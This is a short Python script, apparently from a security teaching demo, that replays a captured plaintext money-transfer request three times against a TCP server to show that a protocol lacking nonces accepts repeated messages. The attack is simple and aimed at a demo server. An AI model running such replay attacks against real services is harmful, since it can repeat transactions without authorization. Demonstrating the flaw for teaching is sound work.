"""
attacker.py - Replay Attack Demo (Plaintext, No Nonce)

This attacker replays a previously captured plaintext message multiple times.
The server accepts the same request repeatedly, demonstrating the lack
of replay protection in the protocol.

Usage:
    python attacker.py --port 9000
"""

import time
import argparse

from config import DEFAULT_HOST
from utils.attacker_runner import run_tcp_attack

# --- Parse CLI arguments ---
parser = argparse.ArgumentParser()
parser.add_argument("--port", type=int, required=True, help="Port to connect to")
args = parser.parse_args()

server_host = DEFAULT_HOST
server_port = args.port

# --- Construct a previously captured plaintext message to replay ---
plain_text = "username=alice&action=transfer&amount=1000"
message = plain_text  # send as raw string

# --- Replay the same message multiple times ---
for i in range(3):
    print(f"\n🔁 Replay Attempt {i + 1}")

    response = run_tcp_attack(
        host=server_host,
        port=server_port,
        plain_text=plain_text,
        payload=message,  # NOTE: must be str
        verbose=True
    )

    if i < 2:
        time.sleep(1.2)

print()